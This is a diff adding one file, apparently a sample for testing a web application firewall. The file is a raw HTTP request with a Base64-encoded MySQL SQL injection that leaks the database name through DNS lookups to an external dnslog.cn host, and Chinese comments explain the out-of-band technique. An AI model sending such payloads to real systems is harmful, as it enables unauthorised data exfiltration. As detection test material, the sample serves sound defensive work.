@@ -1,0 +1,10 @@
+# SQL注入_GET_mysql_DNS注入(Base64编码)
+# 在无法直接利用漏洞获得回显，或sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被安全设备拦截的情况下，如果目标可以发起DNS请求，此时可通过DNSlog把想获得的数据外带出来，在DNSlog日志中查看。
+# 该SQL注入语句的攻击目的是通过dns查询外带获取mysql数据库名称信息。
+GET /?MScgYW5kIGxvYWRfZmlsZShjb25jYXQoIi8vIixkYXRhYmFzZSgpLCIudTl6azZzLmRuc2xvZy5jbi8xMjMiKSkgLS0=&bid=hd_tag_m8mv26i3 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26i3
+RM-PRO-Token: e1a67bc1f36adf9a5a0c56ea1a4104ac
+RM-PRO-Time: 1742808620027
+User-Agent: curl/7.83.1
+
